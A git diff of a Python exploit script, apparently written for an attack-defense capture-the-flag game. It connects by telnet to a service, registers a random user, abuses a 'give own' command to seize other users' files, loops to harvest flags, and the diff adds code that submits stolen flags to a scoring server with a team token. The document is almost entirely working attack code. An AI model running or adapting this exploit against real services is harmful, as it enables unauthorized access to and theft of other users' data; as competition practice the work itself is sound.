@@ -6,10 +6,16 @@ import string
 import sys
 import socket
 import telnetlib
+import requests
 from time import sleep
 
 PORT = 10081
 
+def submit_flags(flags, x_token):
+    r = requests.put("http://10.0.0.1:8080/flags",
+                     headers={'X-Team-Token': x_token},
+                     json=[item for item in flags], timeout=120)
+    print(r.json())
 
 class WaryTelnet(telnetlib.Telnet):
     def expect(self, list, timeout=None):
@@ -63,9 +69,11 @@ def diff(first, second):
 
 
 if __name__ == "__main__":
-    tn = WaryTelnet("127.0.0.1", PORT, timeout=10)
-    username = generate_rand(8)
-    password = generate_rand(8)
+    x_token = str(sys.argv[1])
+    is_send_flags = bool(sys.argv[2])
+    tn = WaryTelnet("10.0.0.114", PORT, timeout=10)
+    username = generate_rand(16)
+    password = generate_rand(16)
     if not register(tn, username, password):
         print("nu i govno")
         exit()
@@ -81,6 +89,7 @@ if __name__ == "__main__":
         names[-1] = names[-1].split("'")[0]
         names = [filename for filename in names if len(filename)==16]
         #print(names)
+        names = names[-10:]
         for name in names:
             tn.write(b"give own " + name.encode() + b" " + username.encode() + b"\n")
             tn.expect([b"DONE!"],5)
@@ -95,5 +104,7 @@ if __name__ == "__main__":
                 if flag not in old_flags:
                     old_flags.append(flag)
                     print(f"here are flags: {flag}")
+                    if is_send_flags :
+                        submit_flags([flag],x_token)
         print("i sleep, bro")
         sleep(10)
